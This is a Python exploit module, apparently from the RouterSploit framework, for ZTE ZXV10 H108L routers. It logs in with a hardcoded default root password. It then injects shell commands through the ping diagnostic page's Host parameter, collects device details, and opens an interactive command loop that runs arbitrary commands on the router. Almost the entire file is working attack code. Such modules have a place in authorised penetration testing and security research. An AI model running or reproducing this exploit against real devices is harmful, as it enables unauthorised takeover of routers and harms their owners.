# rsf exploit module
# description: Exploits ZTE ZXV10 H108L remote code execution vulnerability that allows executing commands on the operating system level.

import re
import time
import requests

class Exploit:
    __info__ = {
        "name": "ZTE ZXV10 RCE",
        "description": "Exploits ZTE ZXV10 H108L remote code execution vulnerability that allows executing commands on the operating system level.",
        "authors": (
            "Anastasios Stasinopoulos",  # vulnerability discovery
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
        "references": (
            "https://github.com/stasinopoulos/ZTExploit/",
        ),
        "devices": (
            "ZTE ZXV10 H108L",
        ),
    }

    def __init__(self, target, port=80, username="root", password="W!n0&oO7."):
        self.target = target
        self.port = port
        self.username = username
        self.password = password
        self.session = requests.Session()

    def run(self):
        if self.login():
            print("Target seems to be vulnerable")
            self.info()
            print("Invoking command loop")
            self.shell()
        else:
            print("Exploit failed - target seems to be not vulnerable")

    def execute(self, cmd):
        path = f"/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch&Host=;echo $({cmd})&NumofRepeat=1&DataBlockSize=64&DiagnosticsState=Requested&IF_ACTION=new&IF_IDLE=submit"
        try:
            response = self.session.get(f"http://{self.target}:{self.port}{path}")
            time.sleep(3)
            response = self.session.get(f"http://{self.target}:{self.port}/getpage.gch?pid=1002&nextpage=manager_dev_ping_t.gch")
            time.sleep(1)
            res = re.findall(r'textarea_1">(.*) -c', response.text)
            if res:
                return res[0]
        except Exception:
            pass
        return ""

    def info(self):
        try:
            response = self.session.get(f"http://{self.target}:{self.port}/template.gch")
            model = re.findall(r'Frm_ModelName" class="tdright">(.*)<', response.text)
            serial = re.findall(r'Frm_SerialNumber" class="tdright">(.*)', response.text)
            hardware = re.findall(r'Frm_HardwareVer" class="tdright">(.*)<', response.text)
            boot = re.findall(r'Frm_BootVer"  class="tdright">(.*)<', response.text)
            if model:
                print(f"Model Name: {model[0]}")
            if serial:
                print(f"Serial Number: {serial[0]}")
            if hardware:
                print(f"Hardware Version: {hardware[0]}")
            if boot:
                print(f"Boot Loader Version: {boot[0]}")
        except Exception:
            pass

    def login(self):
        try:
            response = self.session.get(f"http://{self.target}:{self.port}/")
            logintoken = re.findall(r'Frm_Logintoken"\).value = "(.*)";', response.text)
            if logintoken:
                logintoken = logintoken[0]
                data = {
                    "Frm_Logintoken": logintoken,
                    "Username": self.username,
                    "Password": self.password
                }
                response = self.session.post(f"http://{self.target}:{self.port}/login.gch", data=data)
                if ("Username" not in response.text and "Password" not in response.text and
                   "404 Not Found" not in response.text and response.status_code != 404):
                    print("Successful authentication")
                    return True
        except Exception:
            pass
        return False

    def shell(self):
        while True:
            cmd = input("Enter command: ")
            if cmd == 'exit':
                break
            print(self.execute(cmd))

    def check(self):
        return self.login()

